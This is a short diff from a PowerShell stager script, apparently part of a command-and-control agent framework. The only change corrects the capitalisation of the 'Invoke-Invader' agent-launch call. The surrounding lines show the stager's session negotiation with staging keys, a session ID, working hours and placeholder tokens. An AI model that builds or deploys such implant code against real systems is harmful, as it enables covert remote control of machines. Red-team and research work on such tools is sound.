@@ -216,7 +216,7 @@ function Start-Negotiate {
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
-    Invoke-invader -Servers @('NONE') -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "REPLACE_WORKING_HOURS" -ProxySettings $Script:Proxy;
+    Invoke-Invader -Servers @('NONE') -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "REPLACE_WORKING_HOURS" -ProxySettings $Script:Proxy;
 }
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
 Start-Negotiate -T "REPLACE_TOKEN" -PI "REPLACE_POLLING_INTERVAL" -SK "REPLACE_STAGING_KEY" -UA $u;
